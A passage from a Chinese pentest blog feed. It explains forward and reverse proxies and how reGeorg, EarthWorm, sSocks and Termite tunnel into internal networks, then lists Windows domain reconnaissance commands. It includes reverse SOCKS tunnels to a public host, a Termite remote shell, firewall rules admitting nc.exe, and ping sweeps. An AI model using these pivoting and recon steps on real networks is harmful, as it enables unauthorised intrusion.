200</code>等选项</p><h4 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP/HTTPS"></a>HTTP/HTTPS</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a><a href="https://github.com/sensepost/reGeorg">reGeorg</a></h5><p>reGeorg 是 reDuh 的升级版，主要功能是把内网服务器端口的数据通过 HTTP/HTTPS 隧道转发到本机，实现基于 HTTP 协议的通信。 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 reGeorgSocksProxy.py -h<br><br>usage: reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u  [-v]                      <br>                                                                              <br>Socks server for reGeorg HTTP(s) tunneller                                    <br>                                                                              <br>optional arguments:                                                           <br>  -h, --help           show this help message and exit                        <br>  -l , --listen-on     The default listening address                          <br>  -p , --listen-port   The default listening port                             <br>  -r , --read-buff     Local read buffer, max data to be sent per POST        <br>  -u , --url           The url containing the tunnel script                   <br>  -v , --verbose       Verbose output[INFO|DEBUG]                             <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304133010463.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304140512685.png"></p><p>win下可以使用代理工具proxifier</p><p>linux下用proxychains</p><p><strong>在指定代理类型时，如果指定socks4，将不能使用ping命令，后续介绍</strong></p><p>指定某些程序由127.0.0.1:1234代理，就将流量转发到内网</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304135427676.png"></p><p>有http请求，请求中的参数为cmd,target,port</p><p>由于regeorg脚本特征非常明显，很多杀软都会对其进行查杀</p><h2 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a>代理技术</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/vpn.jpeg"></p><h3 id="代理类型"><a href="#代理类型" class="headerlink" title="代理类型"></a>代理类型</h3><p>代理分为正向代理和反向代理</p><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a><strong>正向代理</strong></h4><p>通常我们说的代理，都是指的正向代理。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3efba166d9c57f233999dec4abb5bdfb_720w-165293759153410.jpg"></p><p>继续看这张图，你会发现，此处的代理服务器可以由客户端提供，也可以由服务器端提供。</p><p>当客户端主动使用代理服务器时，此时的代理叫正向代理。比如：一些网络代理工具（加速器/VPN…）</p><h5 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a><strong>完整流程</strong></h5><p>正向代理时，由客户端发送对某一个目标服务器的请求，代理服务器在中间将请求转发给该目标服务器，目标服务器将结果返回给代理服务器，代理服务器再将结果返回给客户端。</p><p>使用正向代理时，客户端是需要配置代理服务的地址、端口、账号密码（如有）等才可使用的。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-4880f5f7d29e9669f3548ae6f00b4bdf_720w.jpg"></p><p>通过上图可以看到，客户端并没有直接与服务器相连。正向代理隐藏了真实的客户端地址。可以很好地保护客户端的安全性。</p><h5 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h5><ul><li><p><strong>访问被禁止的资源</strong>（让客户端访问原本不能访问的服务器。可能是由于路由的原因，或者策略配置的原因，客户端不能直接访问某些服务器。为了访问这些服务器，可通过代理服务器来访问）</p><ul><li><p>突破网络审查（比如谷歌、youtube…）</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-0b8beb6ccd71b1f232343a4900aa2471_720w.jpg"></p></li><li><p>再比如客户端IP被服务器封禁，可以绕过IP封禁</p></li><li><p>也可以突破网站的区域限制</p></li></ul></li><li><p><strong>隐藏客户端的地址</strong>（对于被请求的服务器而言，代理服务器代表了客户端，所以在服务器或者网络拓扑上，看不到原始客户端）</p></li><li><p><strong>进行客户访问控制</strong></p><ul><li>可以集中部署策略，控制客户端的访问行为（访问认证等）</li><li>记录用户访问记录（上网行为管理）</li><li>内部资源的控制（公司、教育网等）</li></ul></li><li><p><strong>加速访问资源</strong></p><ul><li>使用缓冲特性减少网络使用率（代理服务器设置一个较大的缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。）</li></ul></li><li><p><strong>过滤内容</strong>（可以通过代理服务器统一过滤一些危险的指令/统一加密一些内容、防御代理服务器两端的一些攻击性行为）</p></li></ul><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a><strong>反向代理</strong></h4><p>服务器根据客户端的请求，从其关系的一组或多组后端服务器（如Web服务器）上获取资源，然后再将这些资源返回给客户端，客户端只会得知代理服务器的IP地址，而不知道在代理服务器后面的服务器集群的存在。</p><h5 id="完整流程-1"><a href="#完整流程-1" class="headerlink" title="完整流程"></a>完整流程</h5><p>由客户端发起对代理服务器的请求，代理服务器在中间将请求转发给某一个服务器，服务器将结果返回给代理服务器，代理服务器再将结果返回给客户端。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-d70c2447834f518a04d6c34ce7574231_720w-165293785745817.jpg"></p><h5 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h5><ul><li><p><strong>负载均衡</strong></p><ul><li>如果服务器集群中有负荷较高者，反向代理通过URL重写，根据连线请求从负荷较低者获取与所需相同的资源或备援。可以有效降低服务器压力，增加服务器稳定性</li></ul></li><li><p><strong>提升服务器安全性</strong></p><ul><li><p>可以对客户端隐藏服务器的IP地址</p></li><li><p>也可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等</p></li></ul></li><li><p><strong>加密/SSL加速：</strong>将SSL加密工作交由配备了SSL硬件加速器的反向代理来完成</p></li><li><p><strong>提供缓存服务</strong>，加速客户端访问</p><ul><li>对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务</li></ul></li><li><p><strong>数据统一压缩</strong></p><ul><li><p>节约带宽</p></li><li><p>为网络带宽不好的网络提供服务</p></li></ul></li><li><p><strong>统一的访问权限控制</strong></p></li><li><p><strong>统一的访问控制</strong></p></li><li><p><strong>突破互联网的封锁</strong></p><ul><li>突破谷歌访问封锁</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-c1e97a220e4b5e23ca15faf2f687f206_720w.jpg"></p><p>也就是说，不需要客户端进行代理，我们通过谷歌代理网站（该代理服务器可以访问谷歌，而我们可以访问该公开的代理服务器），也可以突破封锁。</p><ul><li><strong>为在私有网络下</strong>（如局域网）的服务器集群提供NAT穿透及外网发布服务</li><li><strong>上传下载减速控制</strong></li></ul><h3 id="代理情景"><a href="#代理情景" class="headerlink" title="代理情景"></a>代理情景</h3><p>前言道，lcx等端口转发技术</p><p>适用端口转发的网络环境有以下几种：</p><ol><li><p>   服务器处于内网，可以访问外部网络。</p></li><li><p>   服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p></li><li><p>   服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</p></li></ol><p>对于以上三种情况，lcx可以突破1和2二种，但是第3种就没有办法了，因为lcx在使用中需要访问外部网络。</p><p>那么这里就要讲到<strong>socks协议(防火墙安全会话转换协议)</strong></p><p>socks代理服务可以简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。</p><p>其工作于OSI第五层——会话层，介于传输层和表示层，因此不提供如<strong>传递ICMP信息</strong>之类的网络层服务</p><p>在实际渗透测试过程中，当我们成功的拿下第一台堡垒机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。</p><p>目前有两个版本：SOCKS4和SOCKS5</p><p>SOCKS4支持TELNET、FTPHTTP等TCP协议；SOCKS5支持TCP与UDP，并支持安全认证方案。</p><p>基于socks协议的转发代理工具：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/beepress-image-140684-1599633756.png"></p><p><strong>1.Earthworm</strong>   工具网址：<a href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a> </p><p>EW 是一套便携式的网络穿透工具，具有 SOCKS  v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。</p><p>目前已经有了最新版Termite，工具网址：<a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a> </p><p><strong>2.reGeorg</strong>     工具网址：<a href="https://github.com/NoneNotNull/reGeorg">https://github.com/NoneNotNull/reGeorg</a> </p><p>reGeorg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。</p><p><strong>3.sSocks</strong>      工具网址：<a href="http://sourceforge.net/projects/ssocks/">http://sourceforge.net/projects/ssocks/</a> </p><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13。</p><p><strong>4.SocksCap64</strong>   工具网址：<a href="http://www.sockscap64.com/">http://www.sockscap64.com</a> (需翻墙)</p><p>SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。</p><p><strong>5.proxychains</strong>   工具网址：<a href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a> </p><p>Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，支持proxy chain，即可配置多个代理，同一个proxy chain可使用不同类型的代理服务器。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="sSocks"><a href="#sSocks" class="headerlink" title="sSocks"></a>sSocks</h4><ul><li><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。官方地址：<a href="http://sourceforge.net/projects/ssocks/">sSocks (Socks5 Server) download | SourceForge.net</a></p></li><li><p>下载解压后，执行命令编译</p><blockquote><p>./configure &amp;&amp; make</p></blockquote></li><li><p>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：</p><ul><li>nsocks：类似通过Socks5代理后的netcat，可用来测试socks server</li><li>ssocksd：用来开启Socks5代理服务</li><li>rssocks：本地启用Socks5服务，并反弹到另一IP地址</li><li>rcsocks：接收反弹过来的Socks5服务，并转向另一端口</li></ul></li></ul><p>使用方法<strong>和nc差不多用，只不过分开了服务端和客户端</strong></p><ol><li>公网主机上执行：</li></ol><blockquote><p><strong>rc</strong>socks -l 80 -p 443 -vv</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132529954.png"></p><ol start="2"><li>内网主机上执行：</li></ol><blockquote><p><strong>rs</strong>socks –vv –socks 公网主机ip:443</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132806331.png"></p><p>启一个1000监听(浏览器访问了一下，如下)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132914780.png"></p><ol start="3"><li>这时本地主机可以通过访问公网主机的80 端口访问内网主机：</li></ol><blockquote><p>curl –socks5 公网IP:80 内网:1000</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327133336510.png"></p><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p><a href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p><p>关于 EW 的介绍</p><p>下图是一张示意图:</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305154115425.png"></p><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p><p>工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内</p><p>使用方法：</p><p>以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.</p><p>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）</p><ul><li>正向SOCKS v5服务器</li></ul><p>直接公网服务器上面执行，将其作为SOCKS5服务器使用，我们就可以添加使用… //如果这个服务器在境外，那么就成功翻墙了</p><blockquote><p>./ew -s ssocksd -l 1080</p></blockquote><p>这是一个<strong>正向代理</strong>过程</p><ul><li>反弹 SOCKS v5 服务器</li></ul><p>这个操作具体分两步：</p><p>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><blockquote><p>./ew -s rcsocks -l 80 -e 443 </p></blockquote><p>b) 在无公网的跳板机B(192.168.254.128)上启动 SOCKS v5 服务并反弹到公网主机的 443端口</p><blockquote><p>./ew -s rssocks -d 1.1.1.1 -e 443 </p></blockquote><p>c) 访问无公网的目标主机c(192.168.254.130)等等</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220519140717831.png"></p><p>这是<strong>反向代理</strong></p><ul><li>多级级联</li></ul><p> 工具中自带的三条端口转发指令，它们的参数格式分别为：</p><blockquote><p>./ew -s lcx_listen -l 1080 -e 8888<br>./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999<br>./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</p></blockquote><p> 通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。</p><p> 首先提供两个“二级级联”本地SOCKS测试样例：</p><p>  a) lcx_tran 的用法</p><blockquote><p>./ew -s ssocksd -l 9999<br>./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</p></blockquote><p><strong>端口转发+正向代理</strong></p><p>如图：centos与kali在同一内网：kali具有公网ip，内网只可以连接centos，外网不可直接访问centos(往往目标不出网)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326220356565.png"></p><p>此时可以访问kali x.x.x.128:2333来使用centos架设的socks5代理</p><p>同样的情景：境外vps启了一个容器，防火墙策略组的存在，8000端口无法访问，也可以直接在有公网的机器架设socks5服务</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125535619.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125347604.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326110539622.png"></p><p>这是正向代理还是反向代理呢？</p><p>正向代理？如果站在目标服务器的角度，它没有说明出网还是不出网，也没有sock5监听，只是在与目标服务器等同地位的，具有公网ip的服务器架设了socks5服务，这看起来和翻墙是等价的，即视为正向代理？</p><p>反向代理？目标服务器也没有对我们服务器连接的一个操作</p><p>这其实是非常简单的一种网络环境，应该视为反向代理，把vps视为目标边界且具有公网ip的一台服务器，该容器是和服务器在同一内网的机器，在公网机器起了一个socks5服务，并且能够通过公网访问到容器，完全就等价于内网穿透，而内网穿透本质就是反向代理</p><p>说白了就是要看目的以及目标的网络地位和服务，上面说这台机子如果是境外的，那么就实现了翻墙，但是翻墙的目标并不是这个内网机器，而是广域的被网络审查的机器</p><p>  b) lcx_listen、lcx_slave 的用法</p><blockquote><p>./ew -s lcx_listen -l 1080 -e 8888<br>./ew -s ssocksd -l 9999<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220326224539.png"></p><p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><blockquote><p>./ew -s rcsocks -l 1080 -e 8888<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>./ew -s lcx_listen -l 9999 -e 7777<br>./ew -s rssocks -d 127.0.0.1 -e 7777</p></blockquote><p> 数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p><p>补充说明：</p><p>为了减少网络资源的消耗，程序中添加了超时机制，默认时间为10000毫秒（10秒），用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制将以隧道中最短的时间为默认值。</p><p>多级级联的三种状态可以转发任意以TCP为基础的通讯服务，包括远程桌面／ssh服务 等</p><h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h4><p><a href="https://www.cnblogs.com/0nth3way/p/11690810.html">https://www.cnblogs.com/0nth3way/p/11690810.html</a></p><ol><li>以服务模式启动一个agent服务。</li></ol><blockquote><p> ./agent -l 8888</p></blockquote><ol start="2"><li>令管理端连接到agent并对agent进行管理。</li></ol><blockquote><p>./admin -c 127.0.0.1 -p 8888</p></blockquote><ol start="3"><li>此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。</li></ol><blockquote><p>help</p></blockquote><ol start="4"><li>通过show指令可以得到当前agent的拓扑情况。</li></ol><blockquote><p>show<br>0M<br>+– 1M</p><p>由于当前拓扑中只有一个agent，所以展示结果只有 1M ,其中1 为节点的ID号，M为MacOS系统的简写，Linux为L，Windows简写为W。</p></blockquote><ol start="5"><li>将新agent加入当前拓扑</li></ol><blockquote><p>./agent -c 127.0.0.1 -p 8888</p></blockquote><ol start="6"><li>此时show指令将得到如下效果</li></ol><blockquote><p>0M<br>+– 1M<br>|+– 2M<br>  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。</p></blockquote><ol start="7"><li>在2节点开启socks代理，并绑定在本地端口</li></ol><blockquote><p>goto 2<br>将当前被管理节点切换为 2 号节点。<br>socks 1080<br>此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。</p></blockquote><ol start="8"><li>在1号节点开启一个shell并绑定到本地端口</li></ol><blockquote><p>goto 1<br>shell 7777<br>此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.</p></blockquote><ol start="9"><li>将远程的文件下载至本地</li></ol><blockquote><p>goto 1<br>downfile 1.txt 2.txt<br>将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt</p></blockquote><ol start="10"><li>上传文件至远程节点</li></ol><blockquote><p>goto 2<br>upfile 2.txt 3.txt<br>将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt</p></blockquote><ol start="11"><li>端口转接</li></ol><blockquote><p>goto 2<br>lcxtran 3388 10.0.0.1 3389<br>以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口</p></blockquote><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><strong>内网穿透的本质属于反向代理</strong></p><p><a href="https://github.com/fatedier/frp">frp</a></p><p>直接利用ss翻墙容易被ban掉ip，可以frp中转</p><p><a href="https://calxu.github.io/note/20200301_vpn_2/">https://calxu.github.io/note/20200301_vpn_2/</a></p><p><a href="https://github.com/ehang-io/nps">nps</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h1><p>三问：我是谁？这是哪？我在哪？即判断当前机器，当前机器所处的网络环境(拓扑结构分析)，当前机器所处的区域</p><p>我是谁：分析当前机器的角色，web 服务器、开发测试服务器、文件服务器、代理服务器、DNS 服务器等等</p><p>这是哪：整个内网结构的分析</p><p>我在哪：DMZ、办公区、核心区；或者在其他区域</p><h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="1-手动收集"><a href="#1-手动收集" class="headerlink" title="1. 手动收集"></a>1. 手动收集</h3><ul><li>网络配置</li></ul><blockquote><p><strong>ipconfig /all</strong></p></blockquote><ul><li>系统信息</li></ul><blockquote><p><strong>systeminfo</strong></p><p>提权：<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p><p>在初步获得的 shell 回显不足时，可以配合通配符和命令 findstr</p><p>查看系统架构</p><p><strong>echo %PROCESSOR_ARCHITECTURE%</strong></p><p>这个命令判断操作系统位数是不准确的，取决于 shell 当前的 CMD 位数</p></blockquote><ul><li>查看安装软件信息</li></ul><blockquote><p><strong>wmic product get name,version</strong></p><p>在蚁剑拿到的 webshell 没有此命令的回显，可以&gt; 1.txt 后 type、more 打开</p><p><strong>powershell “Get-WmiObject -class Win32_Product|Select-Object -Property name,version“</strong></p></blockquote><ul><li>查看服务</li></ul><blockquote><p><strong>wmic service list brief</strong></p></blockquote><ul><li>查看进程</li></ul><blockquote><p><strong>tasklist</strong></p><p><strong>wmic process list brief</strong></p><p>含句柄数、进程优先级、进程 id、线程数、内存使用等</p></blockquote><ul><li>查看启动程序</li></ul><blockquote><p><strong>wmic startup get caption,command</strong></p></blockquote><ul><li>查看计划任务</li></ul><blockquote><p><strong>schtasks /query</strong></p><p>更具体的用法：schtasks /query /?</p><p>如遇报错，<strong>chcp 437</strong>即可</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211173305284.png"></p></blockquote><ul><li>查看主机统计数据</li></ul><blockquote><p><strong>net statistic workstation</strong></p></blockquote><ul><li>查询用户、组</li></ul><blockquote><p>net user</p><p><strong>query user || qwinsta</strong> 查看在线用户</p><p>net localgroup</p></blockquote><ul><li>列出或断开本地计算机与所连接的客户端之间的会话</li></ul><blockquote><p>客户端 net use \stu1.god.org hongrisec@2019 /u:administrator</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220047347.png"></p><p>注意被连接的计算机可能需要关闭域防火墙，如果不行请排查对应服务</p><p><strong>net session</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220109319.png"></p></blockquote><ul><li>网络连接</li></ul><blockquote><p><strong>netstat -a</strong></p></blockquote><ul><li>补丁信息</li></ul><p>在系统信息里面可以看到，也可以</p><blockquote><p><strong>wmic qfe get caption,description,hotfixid,installedon</strong></p></blockquote><ul><li>共享信息</li></ul><blockquote><p>net share</p><p>wmic share get name,path,status</p></blockquote><ul><li>查询路由表</li></ul><blockquote><p><strong>arp -a</strong></p><p><strong>route print</strong></p></blockquote><ul><li>防火墙</li></ul><blockquote><ol><li>&lt;=winServer2003 ：</li></ol><p>netsh firewall</p><p>e.g.：netsh firewall add allowedprogram c:\nc.exe “nc” enable</p><ol start="2"><li>&gt;winServer2003：</li></ol><p>netsh advfirewall</p><p>e.g.：netsh advfirewall firewall add rule name=”nc” dir=in(入站) action=allow program=”c:\nc.exe”</p><p>允许程序的具体某个端口、协议入站：</p><p>netsh advfirewall firewall add rule name=”RD” protocol=TCP dir=in localport=3389 action=allow</p></blockquote><h3 id="2-自动收集"><a href="#2-自动收集" class="headerlink" title="2. 自动收集"></a>2. 自动收集</h3><p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>一个基于 wmic 的 bat 脚本</p><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><ol><li>查看当前权限</li></ol><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><blockquote><p><strong>whoami</strong></p><p>获取域 SID</p><p><strong>whoami /all</strong></p></blockquote><ol start="2"><li>查询用户(包含在域种)的详细信息</li></ol><blockquote><p><strong>net user xxx /domain</strong></p></blockquote><p>如何在域控中委派“”域账号权限“？</p><p>验证”域账号登录其他机器“</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218163656131.png" alt="image-20220218163656131"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164732019.png" alt="image-20220218164732019"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164932211.png" alt="image-20220218164932211"><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164955920.png" alt="image-20220218164955920"></p><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218165731711.png" alt="image-20220218165731711"></p><blockquote><p><strong>nslookup 域 DNS 后缀</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170123641.png" alt="image-20220218170123641"></p><ul><li>查询当前登录域及登录用户信息</li></ul><blockquote><p><strong>net config workstation</strong></p></blockquote><ul><li>判断主域</li></ul><blockquote><p><strong>net time /domain</strong></p></blockquote><p>会有三种情况：</p><ol><li>存在域，但当前用户不是域用户</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171143257.png"></p><ol start="2"><li>不存在域，当前网络环境为工作组</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170622671.png" alt="image-20220218170622671"></p><ol start="3"><li>存在域，且当前用户登录到域中</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171230372.png" alt="image-20220218171230372"></p><blockquote><p>在域用户切换至本地用户 <strong>计算机名\本地用户</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170819135.png" alt="image-20220218170819135"></p></blockquote><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><blockquote><p><strong>NetBIOS</strong>，为<strong>网上基本输入输出系统</strong>（英语：Network Basic Input/Output System）的缩写，它提供了<a href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI 模型</a>中的<a href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82">会话层</a>服务，让在不同计算机上运行的不同<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935">程序</a>，可以在<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>中，互相连线，以及分享数据。严格来说，NetBIOS 不是一种网上协议，而是<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（API）。较古老的<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">操作系统</a>，使用[IEEE 802.2](<a href="https://baike.baidu.com/item/IEEE">https://baike.baidu.com/item/IEEE</a> 802.2)与<a href="https://baike.baidu.com/item/IPX%2FSPX">IPX/SPX</a>协议，可以使用 NetBIOS Frames 协议或 NetBIOS over <a href="https://baike.baidu.com/item/IPX%2FSPX%E5%8D%8F%E8%AE%AE/659271">IPX/SPX 协议</a>来运作。现代操作系统，多数都使用<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915">TCP/IP 协议</a>，则可透过 NetBIOS over TCP/IP 协议来相互通信</p></blockquote><p><a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p><p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">nbtscan.exe 192.168.7.0/24<br>192.168.7.1     \DP<br>192.168.7.7     TEAMSSIX\DC                     SHARING DC<br>192.168.7.107   TEAMSSIX\DANIEL7                SHARING<br>*timeout (normal end of scan)<br></code></pre></td></tr></table></figure><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><blockquote><p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr “TTL” time to live</p><p>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep “ttl”|awk -F “[ :]+” ‘{print $4}’; done //linux</p></blockquote><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote><p>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</p></blockquote><h3 id="TCPing"><a href="#TCPing" class="headerlink" title="TCPing"></a>TCPing</h3><p><a href="https://elifulkerson.com/projects/tcping.php">TCPing</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 